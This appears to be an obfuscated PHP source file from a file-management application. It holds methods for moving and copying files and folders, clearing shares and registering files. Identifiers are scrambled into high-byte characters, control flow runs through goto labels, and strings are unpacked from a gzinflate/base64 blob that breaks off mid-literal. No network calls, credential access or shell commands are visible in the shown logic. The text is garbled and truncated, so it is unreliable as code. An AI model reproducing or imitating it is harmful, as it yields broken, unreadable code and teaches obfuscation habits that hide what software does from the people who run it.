$cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[412]] == $FÖ‘áÇ÷Õ[191]) { goto bá²‚£Ë Ÿ; b©¨ÈŒ‰Œì: $this->removeNow($c×£¸ô“ÄÊ, !1); $this->folderSizeReset($fíÇÖ§·±¦); Hook::trigger($FÖ‘áÇ÷Õ[568], $EÏÔ¡Ç†ğ´); goto e’ËÖÎ; e’ËÖÎ: return $eñ ©Í´ï¦; goto D°«–§åŞ‰; bá²‚£Ë Ÿ: $Aëêªø¡ÇØ = $this->sourceInfo($eñ ©Í´ï¦); $AËö˜Ç¨°Å = $this->fileHistory($Aëêªø¡ÇØ, $cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[456]], $cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[78]]); if (!$AËö˜Ç¨°Å) { Model($FÖ‘áÇ÷Õ[459])->remove($cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[456]]); } goto b©¨ÈŒ‰Œì; D°«–§åŞ‰: } } $e¾ìîòšŸæ = $B‰£®òÀé ? $B‰£®òÀé : $cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[28]]; $this->lockMoveStart($c×£¸ô“ÄÊ); goto bÍÌêó¯Úõ; bæ˜¶‡ìç: $this->lockMoveEnd($c×£¸ô“ÄÊ); $this->lockWriteEnd($fíÇÖ§·±¦, $e¾ìîòšŸæ); $this->folderSizeReset($cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[487]]); goto AĞ‡´¯Ù´±; b¢¢Ø¶È†„: $FÔ¬¥ŠªÃ™ = $this->fileNameExistCache($fíÇÖ§·±¦, $cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[28]]); $f±ê»ô—Â» = $this->_move($c×£¸ô“ÄÊ, $fíÇÖ§·±¦, $a‘æ¡¿Á…å, $cáĞİñÇ¦Ë, $B‰£®òÀé); $this->sourceCacheClear(); goto döÛïğä·; bÍÌêó¯Úõ: $this->lockWriteStart($fíÇÖ§·±¦, $e¾ìîòšŸæ); $cáĞİñÇ¦Ë = array($FÖ‘áÇ÷Õ[538] => array(), $FÖ‘áÇ÷Õ[569] => !1); $this->clearShare($c×£¸ô“ÄÊ, $fíÇÖ§·±¦); goto b¢¢Ø¶È†„; bÑ¤õõ®Ù: $FÖ‘áÇ÷Õ =& $_SERVER[«¾°Ã¤]; $cáš¬ÆÈí÷ = $this->sourceInfo($c×£¸ô“ÄÊ); $b¯ÓãŒÍäˆ = $this->sourceInfo($fíÇÖ§·±¦); goto CƒÛ¬»ˆ”; CƒÛ¬»ˆ”: if ($cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[487]] == $b¯ÓãŒÍäˆ[$FÖ‘áÇ÷Õ[404]]) { if ($cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[432]] == $FÖ‘áÇ÷Õ[87]) { Model($FÖ‘áÇ÷Õ[430])->restore(array($c×£¸ô“ÄÊ)); } if (!$B‰£®òÀé || $B‰£®òÀé == $cáš¬ÆÈí÷[$FÖ‘áÇ÷Õ[28]]) { return $c×£¸ô“ÄÊ; } } $EÏÔ¡Ç†ğ´ = $this->pathInfoMore($c×£¸ô“ÄÊ); if ($this->isParentOf($c×£¸ô“ÄÊ, $fíÇÖ§·±¦)) { return !1; } goto Dá®¬ß¨¨ö; D©ƒ‹æ¹à«: } private function _move($cÂç¹¬Ñ°î, $EË™Ó¬ó¤‘, $a±“ŸãÓ„Ê, &$cæ£ºØİğ, $c“»º‡’Õ† = '') { goto E‰À±ÍÒÌ¨; E‰À±ÍÒÌ¨: $cåÓ«š®¯‡ =& $_SERVER[«¾°Ã¤]; $fßÌ„ö´Ò© = $this->sourceInfo($cÂç¹¬Ñ°î); $a²„ßô¡è‘ = $fßÌ„ö´Ò©[$cåÓ«š®¯‡[412]] == $cåÓ«š®¯‡[87]; goto D¡«ğî˜œ»; f‚ä©Ù¬ğ: $b–×Æó å = !1; if ($a²„ßô¡è‘) { if ($a±“ŸãÓ„Ê == REPEAT_RENAME_FOLDER) { $DÈˆ²¨“ÔÀ = $this->fileNameAuto($EË™Ó¬ó¤‘, $DÈˆ²¨“ÔÀ, $a±“ŸãÓ„Ê, $a²„ßô¡è‘); $d§òÕ’ÒÒ‰ = $this->_moveForce($cÂç¹¬Ñ°î, $EË™Ó¬ó¤‘, $DÈˆ²¨“ÔÀ); } else { if ($a±“ŸãÓ„Ê == REPEAT_RENAME_FOLDER) { $a±“ŸãÓ„Ê = REPEAT_RENAME; } $dÒº¶¿‘ìø = $this->_childrenListSelect($cÂç¹¬Ñ°î); foreach ($dÒº¶¿‘ìø as $eÇìÛ—Ô¸˜) { $this->_move($eÇìÛ—Ô¸˜[$cåÓ«š®¯‡[404]], $e’‚¶—ìëö, $a±“ŸãÓ„Ê, $cæ£ºØİğ); } $b–×Æó å = !0; } } else { if ($a±“ŸãÓ„Ê == REPEAT_SKIP) { $b–×Æó å = !0; } else { if ($a±“ŸãÓ„Ê == REPEAT_RENAME || $a±“ŸãÓ„Ê == REPEAT_RENAME_FOLDER) { $DÈˆ²¨“ÔÀ = $this->fileNameAuto($EË™Ó¬ó¤‘, $DÈˆ²¨“ÔÀ, $a±“ŸãÓ„Ê, $a²„ßô¡è‘); $d§òÕ’ÒÒ‰ = $this->_moveForce($cÂç¹¬Ñ°î, $EË™Ó¬ó¤‘, $DÈˆ²¨“ÔÀ); } else { if ($a±“ŸãÓ„Ê == REPEAT_REPLACE) { $A¥Õ˜Šâ¡ù = $this->sourceInfoCache($e’‚¶—ìëö); $BÙòà°âù„ = $this->fileHistory($A¥Õ˜Šâ¡ù, $fßÌ„ö´Ò©[$cåÓ«š®¯‡[456]], $fßÌ„ö´Ò©[$cåÓ«š®¯‡[78]]); if ($BÙòà°âù„) { $cæ£ºØİğ[$cåÓ«š®¯‡[538]][] = $fßÌ„ö´Ò©[$cåÓ«š®¯‡[456]]; } else { $b–×Æó å = !0; } } } } } if ($b–×Æó å && !$cæ£ºØİğ[$cåÓ«š®¯‡[569]]) { $cæ£ºØİğ[$cåÓ«š®¯‡[569]] = !0; } goto F«Û¶ïİò¥; F«Û¶ïİò¥: return $d§òÕ’ÒÒ‰; goto F®‹ƒÇ¼–¤; D¡«ğî˜œ»: $DÈˆ²¨“ÔÀ = $c“»º‡’Õ† ? $c“»º‡’Õ† : $fßÌ„ö´Ò©[$cåÓ«š®¯‡[28]]; $e’‚¶—ìëö = $this->fileNameExistCache($EË™Ó¬ó¤‘, $DÈˆ²¨“ÔÀ); $this->lockMoveStart($cÂç¹¬Ñ°î); goto cß‡ö…³„; cß‡ö…³„: $this->lockWriteStart($EË™Ó¬ó¤‘, $DÈˆ²¨“ÔÀ); if (!$e’‚¶—ìëö) { return $this->_moveForce($cÂç¹¬Ñ°î, $EË™Ó¬ó¤‘, $DÈˆ²¨“ÔÀ); } $d§òÕ’ÒÒ‰ = $e’‚¶—ìëö; goto f‚ä©Ù¬ğ; F®‹ƒÇ¼–¤: } private function _moveForce($bä®£È¯­, $a¶¿íËŒß†, $d‹âÎÉ–¨‡) { goto a‹¸òÙÉß½; a‹¸òÙÉß½: $BˆŞĞñğ˜ò =& $_SERVER[«¾°Ã¤]; $d¡½Ô®…ˆ› = $this->sourceInfo($bä®£È¯­); $e†‹—á·Äˆ = $this->sourceInfo($a¶¿íËŒß†); goto Eó†ŠÙè; bŒ½¯İ“àö: if ($FšìòÓê) { $d¦®Ï²ĞÖ = array($BˆŞĞñğ˜ò[562] => array($BˆŞĞñğ˜ò[521], $d¡½Ô®…ˆ›[$BˆŞĞñğ˜ò[496]] . $d¡½Ô®…ˆ›[$BˆŞĞñğ˜ò[404]] . $BˆŞĞñğ˜ò[522])); $f‡Ëƒ¯½íé = $d¡½Ô®…ˆ›[$BˆŞĞñğ˜ò[496]] . $d¡½Ô®…ˆ›[$BˆŞĞñğ˜ò[404]] . $BˆŞĞñğ˜ò[47]; $dºÄŒÂ¥†Ï = $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[496]] . $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[404]] . $BˆŞĞñğ˜ò[47] . $d¡½Ô®…ˆ›[$BˆŞĞñğ˜ò[404]] . $BˆŞĞñğ˜ò[47]; $d´İÚ„º = array($BˆŞĞñğ˜ò[562] => array($BˆŞĞñğ˜ò[570], "\x72\145\160\x6c\x61\x63\145\50\x70\x61\x72\x65\156\164\114\x65\166\145\154\x2c\47{$f‡Ëƒ¯½íé}\x27\x2c\x27{$dºÄŒÂ¥†Ï}\x27\51"), $BˆŞĞñğ˜ò[558] => $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[413]], $BˆŞĞñğ˜ò[559] => $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[493]]); if ($A¥•õ¤‹Åó) { $d´İÚ„º[$BˆŞĞñğ˜ò[431]] = 0; } $this->where($d¦®Ï²ĞÖ)->data($d´İÚ„º)->save(); } $this->where(array($BˆŞĞñğ˜ò[419] => $bä®£È¯­))->data($FìÚ’Šš™)->save(); return $bä®£È¯­; goto FÃÀ‚˜ô; FÄ‰†ïÈßã: if (!$EÁè¿ˆ²— && $this->moveClearAuth) { Model($BˆŞĞñğ˜ò[491])->authClear($bä®£È¯­); } $A¥•õ¤‹Åó = $d¡½Ô®…ˆ›[$BˆŞĞñğ˜ò[432]] == $BˆŞĞñğ˜ò[87] && $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[432]] != $BˆŞĞñğ˜ò[87]; if ($A¥•õ¤‹Åó) { $FìÚ’Šš™[$BˆŞĞñğ˜ò[431]] = 0; } goto bŒ½¯İ“àö; Eó†ŠÙè: $FšìòÓê = $d¡½Ô®…ˆ›[$BˆŞĞñğ˜ò[412]] == $BˆŞĞñğ˜ò[87]; $FìÚ’Šš™ = array($BˆŞĞñğ˜ò[403] => $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[404]], $BˆŞĞñğ˜ò[562] => $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[496]] . $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[404]] . $BˆŞĞñğ˜ò[47], $BˆŞĞñğ˜ò[558] => $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[413]], $BˆŞĞñğ˜ò[559] => $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[493]], $BˆŞĞñğ˜ò[561] => USER_ID, $BˆŞĞñğ˜ò[422] => $d‹âÎÉ–¨‡); $EÁè¿ˆ²— = $d¡½Ô®…ˆ›[$BˆŞĞñğ˜ò[413]] == SourceModel::TYPE_GROUP && $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[413]] == SourceModel::TYPE_GROUP && $d¡½Ô®…ˆ›[$BˆŞĞñğ˜ò[493]] == $e†‹—á·Äˆ[$BˆŞĞñğ˜ò[493]]; goto FÄ‰†ïÈßã; FÃÀ‚˜ô: } private function clearShare($F™‚íÛ´Â¿, $E—Êˆ®µù) { goto dŒÍæÄä ; dìÀøáô°¼: if ($Bææ¶ï´[$c„®ïëÆĞ’[493]] == $dÂ…½Áê[$c„®ïëÆĞ’[493]] && $Bææ¶ï´[$c„®ïëÆĞ’[413]] == $c„®ïëÆĞ’[571]) { return; } $B•Ù•¸•…œ = array($c„®ïëÆĞ’[496] => array($c„®ïëÆĞ’[521], $Bææ¶ï´[$c„®ïëÆĞ’[496]] . $F™‚íÛ´Â¿ . $c„®ïëÆĞ’[522])); $f¥ù¿Úœì„ = $this->field($c„®ïëÆĞ’[419])->where($B•Ù•¸•…œ)->getField($c„®ïëÆĞ’[404], !0); goto b®‹§İ’Æ; dŸˆ‡Ìùæ£: if (!$dİÎ¢õ¨Äš) { return; } $dİÎ¢õ¨Äš = array_to_keyvalue($dİÎ¢õ¨Äš, $c„®ïëÆĞ’[33], $c„®ïëÆĞ’[477]); $B•Ù•¸•…œ = array($c„®ïëÆĞ’[477] => array($c„®ïëÆĞ’[7], $dİÎ¢õ¨Äš)); goto EŸ»Æ‡òÊø; b®‹§İ’Æ: if (!$f¥ù¿Úœì„) { return; } $B•Ù•¸•…œ = array($c„®ïëÆĞ’[404] => array($c„®ïëÆĞ’[7], $f¥ù¿Úœì„), $c„®ïëÆĞ’[484] => 1); $dİÎ¢õ¨Äš = Model($c„®ïëÆĞ’[572])->field($c„®ïëÆĞ’[477])->where($B•Ù•¸•…œ)->select(); goto dŸˆ‡Ìùæ£; EŸ»Æ‡òÊø: Model($c„®ïëÆĞ’[572])->where($B•Ù•¸•…œ)->save(array($c„®ïëÆĞ’[484] => 0)); Model($c„®ïëÆĞ’[573])->where($B•Ù•¸•…œ)->delete(); goto eÃĞ»‰×ˆë; dŒÍæÄä : $c„®ïëÆĞ’ =& $_SERVER[«¾°Ã¤]; $Bææ¶ï´ = $this->sourceInfo($F™‚íÛ´Â¿); $dÂ…½Áê = $this->sourceInfo($E—Êˆ®µù); goto dìÀøáô°¼; eÃĞ»‰×ˆë: } public function copyFolderFromIO($B–·œ‚î—İ, $CÈ‚ùÛÉóˆ, $CÃÚ§µˆÙ, $a„ŠÖòáù, $E×ßÂó‰ç, $FÄÚºòì¯– = false) { goto CÃôÑİ…Ñö; A²š°‡ŒÌ½: $aõŠ¯ÖÅ¸ = $this->fileNameExist($CÃÚ§µˆÙ, $ağİœ§„î); $c…Ççö˜ç„ = $this->mkdir($CÃÚ§µˆÙ, $ağİœ§„î, $a„ŠÖòáù); if (!$aõŠ¯ÖÅ¸ || $a„ŠÖòáù == REPEAT_RENAME_FOLDER) { $a„ŠÖòáù = !1; } goto B™ÈŠ˜Ö‹; DÊÅÙì¦£„: $this->updateModifyTime($CÃÚ§µˆÙ); return $c…Ççö˜ç„; goto DÍ¢“¨Ò¥¢; CÃôÑİ…Ñö: $DÁÎìéÄ‰… =& $_SERVER[«¾°Ã¤]; $F‹¥ø‰¥Ÿ‡ = array($DÁÎìéÄ‰…[539] => array(), $DÁÎìéÄ‰…[540] => array(), $DÁÎìéÄ‰…[538] => array(), $DÁÎìéÄ‰…[574] => array()); $ağİœ§„î = $FÄÚºòì¯– ? $FÄÚºòì¯– : $B–·œ‚î—İ->pathThis($CÈ‚ùÛÉóˆ); goto A²š°‡ŒÌ½; B™ÈŠ˜Ö‹: if ($aõŠ¯ÖÅ¸) { $this->_childrenAllMake($aõŠ¯ÖÅ¸); } Hook::trigger($DÁÎìéÄ‰…[575]); $this->_copyChildTo($B–·œ‚î—İ, $CÈ‚ùÛÉóˆ, $c…Ççö˜ç„, $a„ŠÖòáù, $F‹¥ø‰¥Ÿ‡, $E×ßÂó‰ç); goto fÉƒ‹Íçø; Aµâ†Ò†öƒ: Model($DÁÎìéÄ‰…[459])->linkAdd($F‹¥ø‰¥Ÿ‡[$DÁÎìéÄ‰…[538]]); Model($DÁÎìéÄ‰…[459])->remove($F‹¥ø‰¥Ÿ‡[$DÁÎìéÄ‰…[574]]); $this->folderSizeReset($CÃÚ§µˆÙ); goto DÊÅÙì¦£„; fÉƒ‹Íçø: Hook::trigger($DÁÎìéÄ‰…[576]); if ($c…Ççö˜ç„) { $this->folderSizeResetChildren($c…Ççö˜ç„); } $this->_childrenListClear(); goto c•˜åå³°½; c•˜åå³°½: Model($DÁÎìéÄ‰…[541])->addAll($F‹¥ø‰¥Ÿ‡[$DÁÎìéÄ‰…[539]], array(), !0); Model($DÁÎìéÄ‰…[542])->eventCopy($c…Ççö˜ç„); $this->saveAll($F‹¥ø‰¥Ÿ‡[$DÁÎìéÄ‰…[540]]); goto Aµâ†Ò†öƒ; DÍ¢“¨Ò¥¢: } private function _copyChildTo($eô©´•¼™Ù, $DÏŸæõ†ò, $dãÜ¸…Üî, $f¤‰é„’¥„, &$f¯ÖÔ“±, $F’Û§ŸÓé) { goto dø›©º Ğ•; c£à–Ù—å÷: foreach ($C¿ƒÈŞçò as $eÒ‰½êã„) { $a»Èö–àŒ­ = $dœ°÷ñ‹ÒÛ[$eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[28]]]; $c„ˆ¹Ñ¡‹– = $a»Èö–àŒ­[$d×ƒŠ¢Ñ÷‹[404]]; $this->_copyApplyMeta($a»Èö–àŒ­, $f¯ÖÔ“±); if ($eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[29]] == $d×ƒŠ¢Ñ÷‹[77]) { $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[76]] = $eô©´•¼™Ù->getPathInner($eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[76]]); $this->_copyChildTo($eô©´•¼™Ù, $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[76]], $c„ˆ¹Ñ¡‹–, $f¤‰é„’¥„, $f¯ÖÔ“±, $F’Û§ŸÓé); } } goto Cº³ç«ÂÙ¼; dø›©º Ğ•: $d×ƒŠ¢Ñ÷‹ =& $_SERVER[«¾°Ã¤]; $bÆ’ÍÏƒ = $this->sourceInfoCache($dãÜ¸…Üî); $c•¡ÕèÂÖÒ = $eô©´•¼™Ù->listPath($DÏŸæõ†ò); goto fÕ±ƒ£ˆŒ¬; d–ßöçÆ½†: if (!empty($Aˆ›Ô¦ğŒ)) { $this->addAll($Aˆ›Ô¦ğŒ); $this->_childrenListSelect($dãÜ¸…Üî); } $dœ°÷ñ‹ÒÛ = $this->_childrenList($dãÜ¸…Üî); $dœ°÷ñ‹ÒÛ = array_to_keyvalue($dœ°÷ñ‹ÒÛ, $d×ƒŠ¢Ñ÷‹[28]); goto c£à–Ù—å÷; fÕ±ƒ£ˆŒ¬: $c•¡ÕèÂÖÒ = $c•¡ÕèÂÖÒ ? $c•¡ÕèÂÖÒ : array($d×ƒŠ¢Ñ÷‹[74] => array(), $d×ƒŠ¢Ñ÷‹[75] => array()); $C¿ƒÈŞçò = array_merge($c•¡ÕèÂÖÒ[$d×ƒŠ¢Ñ÷‹[74]], $c•¡ÕèÂÖÒ[$d×ƒŠ¢Ñ÷‹[75]]); $bƒğªÀ™ø = $this->_addFiles($eô©´•¼™Ù, $c•¡ÕèÂÖÒ[$d×ƒŠ¢Ñ÷‹[74]], $F’Û§ŸÓé); goto eõŒ‰Óâ—Ë; eõŒ‰Óâ—Ë: $Aˆ›Ô¦ğŒ = array(); foreach ($C¿ƒÈŞçò as &$eÒ‰½êã„) { goto A÷ï‰™êíÂ; b¿óĞØÔ‚: $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[78]] = _get($eÒ‰½êã„, $d×ƒŠ¢Ñ÷‹[78], 0); $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[456]] = _get($eÒ‰½êã„, $d×ƒŠ¢Ñ÷‹[456], 0); if (!isset($eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[577]]) && $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[456]]) { $f¯ÖÔ“±[$d×ƒŠ¢Ñ÷‹[574]][] = $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[456]]; } goto E£ÍÚ¼¬¤; A÷ï‰™êíÂ: if (isset($bƒğªÀ™ø[$eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[28]]])) { $eÒ‰½êã„ = $bƒğªÀ™ø[$eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[28]]]; } $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[412]] = $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[29]] == $d×ƒŠ¢Ñ÷‹[77]; $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[414]] = _get($eÒ‰½êã„, $d×ƒŠ¢Ñ÷‹[168], $d×ƒŠ¢Ñ÷‹[33]); goto b¿óĞØÔ‚; E£ÍÚ¼¬¤: if ($f¤‰é„’¥„) { $C‹ØÇˆˆÓè = $this->fileNameExistCache($dãÜ¸…Üî, $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[28]]); if ($C‹ØÇˆˆÓè) { if ($eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[412]] || $f¤‰é„’¥„ == REPEAT_SKIP) { continue; } if ($f¤‰é„’¥„ == REPEAT_REPLACE) { $a»Èö–àŒ­ = $this->sourceInfoCache($C‹ØÇˆˆÓè); $f·–¨É×ã = $this->fileHistory($a»Èö–àŒ­, $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[456]], $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[78]]); if ($f·–¨É×ã) { $f¯ÖÔ“±[$d×ƒŠ¢Ñ÷‹[538]][] = $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[456]]; } continue; } else { if ($f¤‰é„’¥„ == REPEAT_RENAME) { $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[28]] = $this->fileNameAutoCache($dãÜ¸…Üî, $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[28]], $f¤‰é„’¥„, !1); } } } } if (!$eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[412]] && $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[456]]) { $f¯ÖÔ“±[$d×ƒŠ¢Ñ÷‹[538]][] = $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[456]]; } $Aˆ›Ô¦ğŒ[] = $this->_makeItemData($eÒ‰½êã„, $bÆ’ÍÏƒ, $eÒ‰½êã„[$d×ƒŠ¢Ñ÷‹[28]]); goto b„ÊÛ‘Êºª; b„ÊÛ‘Êºª: } unset($eÒ‰½êã„); goto d–ßöçÆ½†; Cº³ç«ÂÙ¼: } private function _addFiles($cğ‡Ğ›ºÃ, $FÄ«£ÀåóÓ, $AÕŒ—ç‘) { goto cÅÄ¯¶Õ©¦; b §”¾óèÈ: $Dï¼­˜«× = Model($EìÓËÔ÷Ô¨[580]); $A‡ÇŒàòÖõ = $Dï¼­˜«×->where($aŒƒò‡†ìÃ)->select(); $A‡ÇŒàòÖõ = $A‡ÇŒàòÖõ ? $A‡ÇŒàòÖõ : array(); goto FáŠ‡ Øøƒ; cÅÄ¯¶Õ©¦: $EìÓËÔ÷Ô¨ =& $_SERVER[«¾°Ã¤]; if (!$FÄ«£ÀåóÓ || count($FÄ«£ÀåóÓ) == 0) { return array(); } $aÅ‚‚ÓÅöÑ = array(); goto C°ÔãŸ¼÷•; C°ÔãŸ¼÷•: foreach ($FÄ«£ÀåóÓ as &$fÇ¢Äí—ì­) { goto dÈ·ÈŒÍğÊ; cÈÒìäÂ…¾: if (count($aÅ‚‚ÓÅöÑ[$e…¦Š£´ïÛ]) > 1) { $fÇ¢Äí—ì­[$EìÓËÔ÷Ô¨[577]] = !0; } goto E¦ÅÆÆ‡‹; dÈ·ÈŒÍğÊ: Hook::trigger($EìÓËÔ÷Ô¨[578], $fÇ¢Äí—ì­); $fÇ¢Äí—ì­[$EìÓËÔ÷Ô¨[76]] = $cğ‡Ğ›ºÃ->getPathInner($fÇ¢Äí—ì­[$EìÓËÔ÷Ô¨[76]]); $a¬·Óñæ£ƒ = $cğ‡Ğ›ºÃ->hashSimple($fÇ¢Äí—ì­[$EìÓËÔ÷Ô¨[76]]); goto eâÙÇô‰¦ã; eâÙÇô‰¦ã: $e…¦Š£´ïÛ = $cğ‡Ğ›ºÃ->hashMd5($fÇ¢Äí—ì­[$EìÓËÔ÷Ô¨[76]]); if (strlen($e…¦Š£´ïÛ) > 10 && !isset($aÅ‚‚ÓÅöÑ[$e…¦Š£´ïÛ])) { $aÅ‚‚ÓÅöÑ[$e…¦Š£´ïÛ] = array(); } $fÇ¢Äí—ì­[$EìÓËÔ÷Ô¨[171]] = $a¬·Óñæ£ƒ; goto Cˆó¶Çê°™; Cˆó¶Çê°™: $fÇ¢Äí—ì­[$EìÓËÔ÷Ô¨[170]] = $e…¦Š£´ïÛ; Hook::trigger($EìÓËÔ÷Ô¨[579], $fÇ¢Äí—ì­); $aÅ‚‚ÓÅöÑ[$e…¦Š£´ïÛ][] =& $fÇ¢Äí—ì­; goto cÈÒìäÂ…¾; E¦ÅÆÆ‡‹: } unset($fÇ¢Äí—ì­); $aŒƒò‡†ìÃ = array($EìÓËÔ÷Ô¨[170] => array($EìÓËÔ÷Ô¨[7], array_keys($aÅ‚‚ÓÅöÑ))); goto b §”¾óèÈ; BßĞâİ›é: $Dï¼­˜«×->addAll($B½óŞË¯Ù•); $aŒƒò‡†ìÃ = array($EìÓËÔ÷Ô¨[170] => array($EìÓËÔ÷Ô¨[7], array_keys($aÅ‚‚ÓÅöÑ))); $A‡ÇŒàòÖõ = $Dï¼­˜«×->where($aŒƒò‡†ìÃ)->select(); goto eìµ¥æ¬¥; eìµ¥æ¬¥: $A‡ÇŒàòÖõ = $A‡ÇŒàòÖõ ? $A‡ÇŒàòÖõ : array(); foreach ($A‡ÇŒàòÖõ as $a÷©Å„‹÷’) { if (!isset($aÅ‚‚ÓÅöÑ[$a÷©Å„‹÷’[$EìÓËÔ÷Ô¨[170]]])) { continue; } $D¯°Ü¥»¶ì =& $aÅ‚‚ÓÅöÑ[$a÷©Å„‹÷’[$EìÓËÔ÷Ô¨[170]]]; foreach ($D¯°Ü¥»¶ì as &$fÇ¢Äí—ì­) { $fÇ¢Äí—ì­[$EìÓËÔ÷Ô¨[456]] = $a÷©Å„‹÷’[$EìÓËÔ÷Ô¨[456]]; } unset($fÇ¢Äí—ì­); } $Dêï¨ÀÑè¼ = array(); goto AÈÌÖËÛ™; AÈÌÖËÛ™: foreach ($FÄ«£ÀåóÓ as $aĞ•¿”·Ïß) { $Dêï¨ÀÑè¼[$aĞ•¿”·Ïß[$EìÓËÔ÷Ô¨[28]]] = $aĞ•¿”·Ïß; } return $Dêï¨ÀÑè¼; goto Eêàë“±ß; FáŠ‡ Øøƒ: foreach ($A‡ÇŒàòÖõ as $a÷©Å„‹÷’) { if (!isset($aÅ‚‚ÓÅöÑ[$a÷©Å„‹÷’[$EìÓËÔ÷Ô¨[170]]])) { continue; } $DŒõÂ¨¢„˜ = $aÅ‚‚ÓÅöÑ[$a÷©Å„‹÷’[$EìÓËÔ÷Ô¨[170]]]; foreach ($DŒõÂ¨¢„˜ as &$fÇ¢Äí—ì­) { $fÇ¢Äí—ì­[$EìÓËÔ÷Ô¨[456]] = $a÷©Å„‹÷’[$EìÓËÔ÷Ô¨[456]]; $fÇ¢Äí—ì­[$EìÓËÔ÷Ô¨[577]] = !0; } unset($fÇ¢Äí—ì­); } $B½óŞË¯Ù• = array(); foreach ($FÄ«£ÀåóÓ as $aÏÍ§²’¬ã) { if (isset($aÏÍ§²’¬ã[$EìÓËÔ÷Ô¨[577]]) && $aÏÍ§²’¬ã[$EìÓËÔ÷Ô¨[577]]) { continue; } $a°ãÔƒæÚ = $cğ‡Ğ›ºÃ->getPathInner($aÏÍ§²’¬ã[$EìÓËÔ÷Ô¨[76]]); $bäÔÔµÀ = $Dï¼­˜«×->addFileMake($a°ãÔƒæÚ, $aÏÍ§²’¬ã[$EìÓËÔ÷Ô¨[78]], $aÏÍ§²’¬ã[$EìÓËÔ÷Ô¨[171]], $aÏÍ§²’¬ã[$EìÓËÔ÷Ô¨[170]], $aÏÍ§²’¬ã[$EìÓËÔ÷Ô¨[28]], $AÕŒ—ç‘); $B½óŞË¯Ù•[] = $bäÔÔµÀ; } goto BßĞâİ›é; Eêàë“±ß: } } define($_SERVER[«¾°Ã¤][581], $_SERVER[«¾°Ã¤][582]); goto F‰¸Ò“Šñ; fÀóİ×ÇÒó: if (!function_exists('_kodDe')) { function _kodDe($Fö°à›«Ô¥) { $Fö°à›«Ô¥ = base64_decode($Fö°à›«Ô¥); $fÛ‰¢Öæ¼ = strlen($Fö°à›«Ô¥); $c°›ÛŒ«› = ''; $c’ÕÍ¬÷²ì = ord($Fö°à›«Ô¥[0]) - 30; for ($eì„ËéÒÈ = 1; $eì„ËéÒÈ < $fÛ‰¢Öæ¼; $eì„ËéÒÈ += 2) { if ($eì„ËéÒÈ + 1 < $fÛ‰¢Öæ¼) { $c°›ÛŒ«› .= chr(ord($Fö°à›«Ô¥[$eì„ËéÒÈ + 1]) + $c’ÕÍ¬÷²ì); $c°›ÛŒ«› .= chr(ord($Fö°à›«Ô¥[$eì„ËéÒÈ]) + $c’ÕÍ¬÷²ì); } else { $c°›ÛŒ«› .= chr(ord($Fö°à›«Ô¥[$eì„ËéÒÈ]) + $c’ÕÍ¬÷²ì); } } return $c°›ÛŒ«›; } } define("\xab\xbe\xb0\xc3\xa4", "\321\347\345\205\205\320\267\230"); $_SERVER[«¾°Ã¤] = explode("\x7c\x1\x7c\x5\x7c\x6", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\xad\x7d\x7\x7c\x1b\x45\xd6\x38\xed\x38\x7a\x39\x7a\x39\xd8\x98\x4\x97\xa8\xd8\x8e\xe3\x38\x76\x1c\x47\xb6\x65\x5b\x44\xb6\x1c\x49\x4e\x75\xa2".base64_decode('rKSVtLGklXdXbkkIHJADQhJ6h6MfPaHX0EI9IAeETiC0JIR6tHAc7Zs+syuZ+w==')."\276\337\377\17\111\64\363\246\354\314\233\231\67\357\275\171\363\346\243\323\226\354\274\344\17\113\166\137\363\344\351\70\260\144\67\360\377\37\160\370\330\25\173\354\204\376"."\xdb\x75\xc5\x99\x65\x65\x1d\xb5\x7b\x8d\xef\xda\x67\xf5\xdd\xb7\xc9\x3b\x37\xbf\xfe\xef\x27\xef\x7e\xe1\xf2\x57\xdf\x7f\xe1\xe6\x70\x7c\xea\x83\x97\x27\x8f\xd9\x69\xc9\x1f\x3e\x18\x5b"."\xf\xb2\xe2\x92\xf5\xf8\x47\xca\x6a\xa6\xa4\xc\xa9\x86\x69\x60\x40\x4c\xcb\x26\xd4\x24\xe\xab\x59\xfc\xeb\xc6\x3f\x46\x7f\x5a\x35\x15\x1c\x8e\x74\x5\xc2\x91\x50\x4f\x77\